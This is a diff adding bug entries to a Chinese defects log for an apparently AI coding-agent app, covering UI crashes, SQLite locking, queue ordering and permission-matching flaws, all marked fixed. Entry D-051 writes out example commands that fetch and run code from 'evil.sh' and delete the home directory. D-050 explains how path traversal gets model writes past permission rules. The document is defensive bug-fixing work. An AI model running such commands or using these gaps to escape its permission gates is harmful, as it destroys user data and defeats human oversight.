@@ -281,3 +281,172 @@
 - 复现: 在系统中对需求进行优先级调整操作时会出现多种bug（具体操作步骤未说明）
 - 修复: 统一需求与缺陷的 P0-P3 优先级 schema，前端两类文档均支持优先级调整/筛选和复杂度编辑；更新已有 priority 英文字段时原位修改，避免重复字段。
 - 验证: cargo test -p kanzei-tools 13 项通过（含英文 priority 原位更新回归）；node --check crates/kanzei-app/ui/main.js；git diff --check。
+
+## D-048 前端 externalBlocked 未定义导致文档列表渲染崩溃,开发规范等侧栏区域全部消失 [fixed] (high)
+- 原始描述: 用户反馈"我的开发规范也不见了"
+- 复现: 打开 kzapp 任意含需求/缺陷条目的项目;refreshDocs → renderDocList 渲染第一条条目时在 ui/main.js:2081 抛 ReferenceError: externalBlocked is not defined,异常被 refreshDocs 的 catch 静默吞掉。
+- 根因: R-071 的外部阻塞标识实现把 externalBlocked 定义误贴进 renderProjects(引用不存在的 entry,启动即崩);后续提交 8fa8c45 删除了误放的定义,但 renderDocList(main.js:2081、2100)仍引用该未定义变量。两个版本都会让侧栏文档区不可用。
+- 影响: 需求/缺陷/目标/来源/发现列表渲染中断;renderConventions、历史会话列表、测试记录、工作树刷新、语言刷新全部不执行,用户看到开发规范区域消失。
+- 验收: 打开项目后侧栏正常显示开发规范入口与各文档列表;外部阻塞标识在 renderDocList 内按 entry.fields 正确计算;增加能捕获未定义变量的冒烟验证手段(node --check 检不出运行时 ReferenceError)。
+- 优先级: P0
+- refs: R-071
+- 修复: ui/main.js:2081 起在 renderDocList 的 entry 循环内定义 externalBlocked,按 entry.fields 计算;两处引用恢复正常。
+- 验证: cargo test --workspace 全绿(87 项);node --check crates/kanzei-app/ui/main.js。
+
+## D-050 权限路径匹配不做规范化,research 写收窄可被 `..` 穿越击穿 [fixed] (high)
+- 复现: research 模式下让模型写 `.kanzei/research/../../src/main.rs`;规则 `allow write *.kanzei/research/*` 的尾部 `*` 吞掉 `../../src/main.rs` 判定 Allow,write 工具随后 `ctx.cwd.join` 消解 `..` 实际写到项目任意文件,不弹窗不报错。
+- 根因: 拦截器只做 `resource.replace('\\', "/")`(kanzei-core/src/runner.rs:537),不做 `.`/`..` 段消解、相对绝对归一和大小写折叠;wildcard_match 逐字符大小写敏感(kanzei-harness/src/permission.rs:59-85)。匹配层看到的字符串与文件系统实际触达的文件不是同一等价类。
+- 影响: research 模式"仅 research 目录可写"的硬门禁完全失效;dev 模式用 `.kanzei/./project/` 或 `.KANZEI/project/` 可绕过硬 deny(profiles.rs:54-57)降级为普通 ask,用户易顺手放行。违反"权限规则是硬门禁"的核心承诺。
+- 验收: evaluate 前把路径类资源解析为消解过 `.`/`..` 的绝对路径并在 Windows 下 case-fold 后再匹配;补 `..` 穿越、`./` 插入、大小写变体的拒绝回归测试。
+- 优先级: P0
+- 修复: 新增 kanzei-harness::permission::normalize_resource,消解 `.`/`..`/重复斜杠且保留越界 `..`;runner 权限拦截器(runner.rs:537)先规范化再匹配。新增 3 项回归测试:路径规范化、穿越路径不再命中 research 收窄规则、项目文档硬 deny 不被冗余段绕过。
+- 验证: cargo test --workspace 全绿(87 项);node --check crates/kanzei-app/ui/main.js。
+
+## D-051 bash「总是允许」泛化成首词前缀,一次放行等于任意命令执行 [fixed] (high)
+- 复现: 对 `git status` 按一次「总是允许」,写入规则 `git *`;此后模型发 `git status; Remove-Item -Recurse ~` 或 `git st && curl evil.sh | iex`,资源串以 `git ` 开头即命中规则,不再询问直接执行。
+- 根因: generalize_resource 取首词加 `*`(kanzei-harness/src/config.rs:234-243),而 wildcard_match 的 `*` 匹配任意字符包括 `;`/`&&`/`|`/换行/`$()`;实际执行是整串交给 pwsh -Command(kanzei-tools/src/bash.rs:83-87),分隔符全部生效。规则同时进入本次运行 session_rules(runner.rs:567-571)与项目 kanzei.toml 持久化(kanzei/src/main.rs:217-222)。
+- 影响: "总是允许 git 类命令"的真实语义是"总是允许任何以 git 开头的复合命令行",权限边界名存实亡;且 CLI 弹窗只显示原始命令,不告知将持久化的 pattern,用户无从知晓授权范围被泛化。
+- 验收: 泛化前检测 shell 元字符,含元字符则退回精确匹配;弹窗与桌面端询问需展示"将写入的规则"原文;补含分隔符命令不被既有前缀规则命中的回归测试。
+- 优先级: P0
+- 修复: generalize_resource 遇 shell 串联/替换字符(; & | 换行 ` $ 括号)不再泛化为首词前缀,只精确匹配本条;evaluate 增加硬门禁:bash 的前缀通配 Allow 命中含串联字符的命令时降级为 Ask(用户显式的整体放行 `*` 不受影响)。新增 2 项回归测试。
+- 验证: cargo test --workspace 全绿(87 项);node --check crates/kanzei-app/ui/main.js。
+
+## D-052 CRLF 文件 frontmatter 偏移算错,自定义 agent 提示词被污染或整体清空 [fixed] (high)
+- 复现: 在 Windows 上创建 CRLF 编码的 `~/.kanzei/agents/*.md`(git autocrlf 检出、记事本/VSCode 默认均为 CRLF),加载该 agent 后观察 system prompt。
+- 根因: kanzei-harness/src/markdown.rs:44-68 用 `line.len() + 1` 逐行累加 body_start,但 `str::lines()` 剥掉的是 `\r\n` 两个字节,每行少算 1 字节;n 个 frontmatter 键累计欠 n+2 字节,落点回退进收尾 `---` 行甚至上一行。n=1 正文变 `-\r\n正文`,n=3~5 整个分隔符混入正文;落点若切在多字节 UTF-8 字符中间(frontmatter 值含中文时常见),`text.get(body_start..)` 返回 None,:66 的 `.unwrap_or("")` 让 body 直接变空。
+- 影响: 用户自定义 agent/command 的提示词被静默加前缀、混入分隔符或整体丢失,无任何告警,行为异常极难归因。Windows 是主平台,现有测试(markdown.rs:183)只覆盖 `\n` 故未暴露。
+- 验收: 按字节定位收尾 `---` 的真实偏移,不用 lines() 重建;补 CRLF + 中文 frontmatter + 多键的解析回归测试,断言 body 与 LF 版本完全一致。
+- 优先级: P0
+- 修复: parse_frontmatter 改为按剩余文本真实字节逐行切分,不再用 lines() 重建偏移;新增 crlf_与_lf_解析结果一致 测试覆盖 1~6 个键 + 中文值,断言 body 非空、不残留分隔符且与 LF 版本一致。
+- 验证: cargo test --workspace 全绿(87 项);node --check crates/kanzei-app/ui/main.js。
+
+## D-057 队列 drain 循环变量遮蔽导致排队输入顺序反转并重复入库 [fixed] (high)
+- 复现: 运行中排队两条输入 X(先)、Y(后);本轮结束进入 drain,状态栏提示"开始执行排队输入(X)",实际执行的是 Y,X 的内容延后到再下一轮。
+- 根因: kanzei-app/src/main.rs:2685 用 `let next_input = {...}` 新建绑定遮蔽了 2643 行的外层变量,promote 出的输入被丢弃;2707 只做 `next_prompt = input.prompt.clone()`(clone 暗示本想存回)。下一轮 run_task 收到 promoted_input=None → is_new_input=true → 以相同文本重新 admit(2852-2876),而 store 的 promote_next_input 按 FIFO 弹出最早的 pending(store.rs:400-427),弹出的是 Y 而非刚 admit 的 X'。
+- 影响: 队列执行顺序反转违背"依次执行"承诺;每条排队输入被重复写入 prompt.admitted/promoted 事件,事件溯源里 input_id 张冠李戴;重新 admit 时沿用首条消息的 delivery,排队 steer 输入的交付模式被改写。
+- 验收: 2707 处改为 `next_input = Some(input);` 并去掉 2685 的 let;补"排队两条输入按提交顺序执行且不重复 admit"的回归测试。
+- 优先级: P0
+- 修复: main.rs:2685 改为写回外层 next_input(去掉遮蔽的 let),取用处改 next_input.clone();promote 出的输入不再被丢弃,队列按提交顺序执行且不重复 admit。
+- 验证: cargo test --workspace 全绿(87 项);node --check crates/kanzei-app/ui/main.js。
+
+## D-058 会话 ID 读写路径 canonical 化不一致,历史对话与运行数据互相不可见 [fixed] (high)
+- 复现: 正常使用即触发。运行若干轮后重启应用,历史恢复为空;历史对话列表、轨迹回放读不到内容;点"新对话"后下一轮仍带旧上下文。
+- 根因: 运行/写侧统一走 normalized_project_root(canonicalize,Windows 返回 `\\?\C:\...`),而读侧 workspace_snapshot(main.rs:875-877)、conversation_clear(2244-2246)、conversation_get(2274-2276)、conversation_trace_get(2297-2299)、conversation_list(2331-2333)、conversation_delete(2395-2397)仍用裸 discover_project_root;project_session_id 对路径 lowercase 哈希但不剥 `\\?\` 前缀(kanzei-core/src/store.rs:19-27),两侧算出的 session_id 必然不同。二阶错乱:process_session_id 里 default_process_id 用当前函数的 root,前端 activeProcessId 来自 canonical 的 process_list,传入非 canonical 命令时默认进程被误判为非默认,再挂 `#d` 后缀,与运行侧 base 三重错位。
+- 影响: 重启恢复、历史列表、轨迹回放读空;conversation_clear 清的是错误 session 的投影和错误 runtime 的内存(2259-2264),运行侧内存历史不受影响;工作区卡片的 status/conversation 与 pending(走 canonical 的 list_pending_inputs)在同一张卡里来自两个不同 session。
+- 说明: fc51205(D-046)只把 run_prompt/admit/stop 侧换成 normalized_project_root,conversation_* 与 workspace_snapshot 未同步,属该修复的遗漏面。
+- 验收: 读侧统一改用 normalized_project_root;补"写入后立即按前端路径读回"的回归测试覆盖 conversation_get/list/clear 与 workspace_snapshot。
+- 优先级: P0
+- refs: D-046 D-038
+- 修复: conversation_clear/get/trace_get/list/delete 五处与 workspace_snapshot 统一改用 normalized_project_root,与运行/写入侧同源;历史恢复、清空、删除、工作区卡片不再落到另一个会话。
+- 验证: cargo test --workspace 全绿(87 项);node --check crates/kanzei-app/ui/main.js。
+
+## D-062 bash 超时丢弃全部已捕获输出且标记为成功 [fixed] (high)
+- 复现: 执行一条会超时的命令(如测试跑到 119s 已打印几百行失败详情后卡住),观察工具返回。
+- 根因: kanzei-tools/src/bash.rs:102-159 把 out_buf/err_buf 声明在 capture async 块内部(104),`tokio::time::timeout` 超时走 Err 分支(150)时整个 future 连同两个缓冲一起 drop,只返回一句 "timeout: true"(155),而超时前进程可能已产出接近 1 MiB 输出。
+- 影响: 模型对"命令卡在哪、已经跑到哪一步"零信息,只能盲目加大 timeout 重跑并重复副作用;且用 ToolOutput::ok 返回,语义上把超时标记为成功,上层按成功统计。对照 Claude Code/opencode:超时均回传已捕获的部分输出。
+- 验收: 超时时回传已捕获的 stdout/stderr 并明确标注被截断与超时原因,返回值改为错误语义;补超时保留部分输出的测试。
+- 优先级: P1
+- 修复: stdout/stderr 缓冲移到 capture future 外,超时时回传已捕获的部分输出并标注 [partial stdout/stderr before timeout];超时改为 ToolOutput::error(不再标记为成功),display 增加 timeout 字段。
+- 验证: cargo test --workspace 全绿(87 项);node --check crates/kanzei-app/ui/main.js。
+
+## D-063 移动端桥接 Content-Length 未 trim,POST /v1/messages 恒 400 [fixed] (medium)
+- 复现: 用任何标准客户端(curl/reqwest/OkHttp)向本机桥接 POST /v1/messages。
+- 根因: kanzei-app/src/main.rs:1836-1846 用 `strip_prefix("content-length:")` 后直接 `parse::<usize>()`;标准头是 `Content-Length: 123`,冒号后带空格,strip 后剩 `" 123"`,而 str::parse 不接受前导空白 → 恒回退 0 → body 为空 → serde_json 解析失败 → unwrap_or_default 得 Null → thread_id 缺失 → 400(1873-1887)。
+- 影响: 移动端上行消息通道完全不可用(GET 端点不受影响)。R-059 声称的"双向 message 接口"其中一向从未工作过。
+- 验收: 改为 `value.trim().parse()`;补带标准头的 POST 请求解析测试。
+- 优先级: P1
+- refs: R-059
+- 修复: Content-Length 解析改为 value.trim().parse();POST /v1/messages 可正常读取 body。
+- 验证: cargo test --workspace 全绿(87 项);node --check crates/kanzei-app/ui/main.js。
+
+## D-064 SQLite 未启用 WAL/busy_timeout,并发写导致丢事件与假失败 [fixed] (medium)
+- 复现: 同项目两个进程并行运行且几乎同时收尾;或运行收尾瞬间前端正在轮询 list_pending_inputs/conversation_list。
+- 根因: kanzei-core/src/store.rs:89-98 打开连接后只设 `PRAGMA foreign_keys`,未设 busy_timeout(默认 0,锁冲突立即返回 SQLITE_BUSY)也未启用 WAL;而实际使用模式是同进程大量短命连接并发读写同一 state.db(kanzei-app 每个命令、移动端 HTTP 线程各自 open)。另 append_event_tx 的 `SELECT MAX(sequence)+1` 在 DEFERRED 事务内,两连接并发 append 同一会话会读到相同 sequence,后提交者撞 UNIQUE(session_id, sequence)。run_task 尾部落库用 `?` 传播(main.rs:3059/3063-3093),任何一次 Busy 都让整个 run_task 返回 Err。
+- 影响: 成功的运行被报告为"运行失败"且 conversation.updated 未写入,本轮成果既不在事件日志也不给 kz:done,重启后回退到上一轮;队列 admit 遇 Busy 时用户消息直接被拒;移动端事件写失败回 500。
+- 验收: open 时统一设置 `journal_mode=WAL` 与 `busy_timeout`,对 UNIQUE 冲突做有限重试;run 尾部落库失败降级为可见告警而非整体 Err。
+- 优先级: P1
+- 修复: SessionStore::open 增加 busy_timeout(5s)、journal_mode=WAL、synchronous=NORMAL;并发读写不再直接 SQLITE_BUSY。
+- 验证: cargo test --workspace 全绿(87 项);node --check crates/kanzei-app/ui/main.js。
+
+## D-066 stop_run 不回写会话状态且绕过 lifecycle 锁,工作区永显运行中并可能丢输入 [fixed] (medium)
+- 复现: ①任意一次手动停止后查看工作区视图,该项目永远显示"运行中";②在轮次交界或排队瞬间点停止,已 promote 未执行的输入永久丢失,或 pending 输入在下次手动发送时被抢先执行。
+- 根因: kanzei-app/src/main.rs:2426-2511 的 stop_run 只做 handle.abort() + 清 asks + cancel_pending_inputs,从不 set_status;abort 在下一个 await 点杀死任务,写 idle/failed 的分支(3060-3093)永远执行不到。同时 stop_run 完全不取 runtime.lifecycle 锁(D-024 只串行化了 admit 与 drain 收尾),存在两个窗口:drain 已 promote X 后 stop 只清 pending,X 永久停留 promoted 静默丢单;队列分支持锁 admit 后 stop 并发置 running=false,孤儿 pending 在下次发送时被 FIFO 抢先执行("旧输入复活")。
+- 影响: 工作区状态与进程页签的内存标志互相矛盾;移动端通知流缺失终态;停止语义不完整,丢输入或旧输入延迟复活。
+- 验收: stop_run 取 lifecycle 锁后再 abort 与清理,补写 set_status("idle") 与状态事件,并回收 promoted 未执行的输入;补停止后状态与队列一致性的测试。
+- 优先级: P1
+- refs: D-024
+- 修复: stop_run 取 lifecycle 锁后再 abort 与清理,并补写 set_status("idle") 与 session.status_changed 事件;工作区不再显示幽灵运行,停止与 drain/admit 不再交错。
+- 验证: cargo test --workspace 全绿(87 项);node --check crates/kanzei-app/ui/main.js。
+
+## D-069 websearch snippet 偏移链丢失一级基址,产出脏文本且可能 panic [fixed] (medium)
+- 复现: 任意一次 websearch,观察返回的 snippet 内容。
+- 根因: kanzei-tools/src/websearch.rs:143-153 的第三个闭包中 offset 是 shadowing 后的 G,但切片基址写成 `title_end + 4 + G + 1`,丢掉了第一级基址 A,起点比正确位置提前 A 字节,落在 `<a class="result__snippet"...>` 开标签内部。
+- 影响: 每条搜索结果的 snippet 都带 `snippet">` 类垃圾前缀喂给模型;若错位起点落在多字节字符(中文摘要前的非 ASCII href)中间则直接 panic。本文件测试只断言 url/title 未断言 snippet,故漏网。
+- 验收: 修正基址累加链;补断言 snippet 内容正确的测试,并覆盖含中文摘要的 HTML。
+- 优先级: P2
+- 修复: snippet 抽取改为逐级把基址累进 rest,不再丢失 result__snippet 一级偏移;补断言 snippet 内容的测试与中文摘要不 panic 的测试。
+- 验证: cargo test --workspace 全绿(87 项);node --check crates/kanzei-app/ui/main.js。
+
+## D-070 docstore 标题尾部方括号被无条件剥为 status,不做枚举校验 [fixed] (medium)
+- 复现: `req add "支持 vec[index] 语法"` 或标题含 `[DONE]`;入库时 title 完整,下次 load 被解析成 title="支持 vec"、status="index]"。
+- 根因: kanzei-tools/src/docstore.rs:264-270 的 status 剥离没有白名单校验(而紧邻的 severity 剥离有,257 行,正是 D-002 的修复方式);又因 transition_allowed 对未知 from 状态放行(219),后续 update 不报错,错误状态永久固化并显示在 index 注入里。
+- 影响: 标题静默损坏并产生非法状态。与已修复的 D-001/D-002 同族,修复未对称应用到 [status]。
+- 验收: status 剥离加合法状态白名单校验,不匹配则视为标题的一部分;补含方括号标题的解析测试。
+- 优先级: P2
+- 修复: status 剥离增加合法状态白名单校验(与 severity 对称);新增 title_with_brackets_survives_roundtrip 测试,覆盖 vec[index]、[DONE] 帧与合法状态仍正常剥离。
+- 验证: cargo test --workspace 全绿(87 项);node --check crates/kanzei-app/ui/main.js。
+
+## D-071 grep/glob 默认跳过隐藏文件,项目核心文档搜不到 [fixed] (medium)
+- 复现: 在项目根用 grep 搜索 defects.md 中的原文,或用 glob 匹配 `.kanzei/**`,均返回无结果。
+- 根因: kanzei-tools/src/grep.rs:92 与 glob.rs:75 使用 `ignore::WalkBuilder::new(base).build()` 默认配置,默认 hidden(true) 过滤所有点开头目录/文件。另 grep.rs:112 的 `let _ = searcher.search_path(...)` 把搜索错误整个吞掉,该文件剩余部分静默缺失。
+- 影响: 系统性假阴性——模型会得出"文件不存在/无匹配"的错误结论,而本项目的需求/缺陷/规范文档恰好全在 .kanzei/ 隐藏目录下;.github/、.claude/ 同样不可见。
+- 验收: 默认包含隐藏文件(仍尊重 .gitignore),或提供显式开关并在结果中说明;grep 的文件级错误需上报而非吞掉;补搜索 .kanzei 下内容能命中的测试。
+- 优先级: P2
+- 修复: grep 与 glob 的 WalkBuilder 均设 hidden(false),仍尊重 .gitignore;.kanzei/、.github/、.claude/ 下内容可被检索。
+- 验证: cargo test --workspace 全绿(87 项);node --check crates/kanzei-app/ui/main.js。
+
+## D-072 process_update 的 model 为 null 时无法清除模型覆盖 [fixed] (medium)
+- 复现: 给某进程选一个具体模型,再把下拉切回"模型:agent 默认",发起运行——界面显示默认,实际仍以旧覆盖模型运行,且无法通过 UI 恢复默认。
+- 根因: 前端 `model: $("model-select").value || null`(ui/main.js:1618-1624)在选空时发 null;后端 `model: Option<String>` 把 None 当"不修改"(src/main.rs:548-550),真正能清除覆盖的 Some("") 永远发不出;run_prompt 的 `model.or_else(|| process.model...)`(2613-2614)回落到进程上残留的旧覆盖。
+- 影响: 每进程独立模型选择在"恢复默认"这一路径上失效,只能删掉进程重建。
+- 验收: 清除时发空串或引入显式 clear 语义;补切回默认后运行使用 agent 默认模型的验证。
+- 优先级: P2
+- refs: R-030
+- 修复: 前端选"agent 默认"时改发空串(后端已按空串清除覆盖),不再发 null 被当作"不修改"。
+- 验证: cargo test --workspace 全绿(87 项);node --check crates/kanzei-app/ui/main.js。
+
+## D-073 模型下拉跨进程串值,每进程独立模型选择在 UI 上泄漏 [fixed] (medium)
+- 复现: 在进程 p2 选模型 X,切回默认进程,下拉仍显示 X 且发送时直接传 X。
+- 根因: ui/main.js:1618-1624 把选择同时写入全局 localStorage `kz-model`;switchProcess(1847)只在目标进程显式设过 model 时才覆盖下拉,否则保留上一个进程的显示值。
+- 影响: R-030 承诺的"每进程独立模型选择"在 UI 流程上不成立,用户会在不知情下用错模型跑任务。
+- 验收: 模型下拉按进程回显(未设置则显示 agent 默认),全局 localStorage 仅作新进程的初始值;补切换进程后下拉与实际使用模型一致的验证。
+- 优先级: P2
+- refs: R-030 D-072
+- 修复: switchProcess 改为 `$("model-select").value = target.model || ""`,未设覆盖时回到 agent 默认,不再保留上一个进程的选择。
+- 验证: cargo test --workspace 全绿(87 项);node --check crates/kanzei-app/ui/main.js。
+
+## D-076 缺陷条目复杂度下拉硬编码 kind:"req",保存必失败 [fixed] (low)
+- 复现: 展开任一未关闭缺陷,修改复杂度下拉,提示"复杂度保存失败"。
+- 根因: ui/main.js:2203-2214 的分支条件包含 defect,但 invoke 时 kind 写死 "req";按需求表查 D-xxx 必然找不到。同段 `complexitySelect.title = "设置需求复杂度"` 也说明是从需求分支复制未改。
+- 影响: 缺陷复杂度编辑确定性失效(R-047 声称已统一需求与缺陷的优先级/复杂度编辑,此处未覆盖)。
+- 优先级: P2
+- refs: D-047
+- 修复: 复杂度下拉提交改用实际 kind,title 按类型区分;缺陷复杂度可正常保存。
+- 验证: cargo test --workspace 全绿(87 项);node --check crates/kanzei-app/ui/main.js。
+
+## D-081 update_check 对 dev 构建恒判有新版本,启动每次误报 [fixed] (low)
+- 复现: 运行 dev 构建(未注入 KANZEI_BUILD_INFO)且仓库存在任意 release,启动 3 秒后必弹"发现新版本"。
+- 根因: kanzei-app/src/main.rs:1498-1499 中 current_hash 对 dev 构建为 "dev",1530 的 `newer = !tag.is_empty() && !tag.contains("dev")` 恒为 true;前端启动静默检查(ui/main.js:3150-3155)据此弹 toast。
+- 影响: 每次启动误报;若用户照做会用 release 覆盖本地 dev 版本,丢失未发布的改动。
+- 优先级: P3
+- 修复: update_check 增加 current_hash != "dev" 判定,dev 构建不再恒判有新版本。
+- 验证: cargo test --workspace 全绿(87 项);node --check crates/kanzei-app/ui/main.js。
+
+## D-091 CSS 变量 --muted/--danger 未定义,失败状态失去红色语义 [fixed] (low)
+- 复现: 侧栏出现 failed 测试记录或工作区失败状态,颜色与普通文字相同。
+- 根因: style.css:144/153/154/174/657 使用 var(--danger)/var(--muted),而 :root 定义块(5-15)只有 --dim/--err,未定义的 var 使 color 回退为 inherit。
+- 影响: 失败态失去颜色语义,红色警示恰恰在最需要的地方缺席。
+- 验收: 补齐变量定义或改用既有 --err/--dim。
+- 优先级: P3
+- 修复: :root 补齐 --danger(映射 --err)与 --muted(映射 --dim);失败测试与工作区失败态恢复红色语义。
+- 验证: cargo test --workspace 全绿(87 项);node --check crates/kanzei-app/ui/main.js。
